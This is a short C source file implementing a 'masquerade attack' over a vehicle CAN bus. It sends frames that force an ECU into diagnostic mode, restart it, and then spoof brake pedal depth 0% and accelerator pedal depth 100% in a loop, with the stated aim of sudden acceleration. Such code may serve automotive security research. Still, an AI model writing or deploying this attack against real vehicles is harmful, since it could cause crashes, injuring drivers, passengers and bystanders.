#include "all_headers.h"
#include "payloads.h"

/*================================================================
msq.c
This function performs the masquerade attack

void msq_msq:
reset ECU and make sudde acceleration
(break pedal depth 0% && accel pedal depth 100%)
==================================================================*/
void msq_msq(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    struct can_frame frame;

    do {
        // resetpayload1 [enter diag mode]
        send_can_packet(socket, addr, msq.payload1, msq.payload1_len, canid);
        // resetpayload2 [restart the ecu]
        send_can_packet(socket, addr, msq.payload2, msq.payload1_len, canid);

        // accelpayload1 [make break pedal depth 0%]
        send_can_packet(socket, addr, msq.payload3, msq.payload1_len, 0x24);
        // accelpayload2 [make accel pedal depth 100%]
        send_can_packet(socket, addr, msq.payload4, msq.payload1_len, 0x39);


        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}
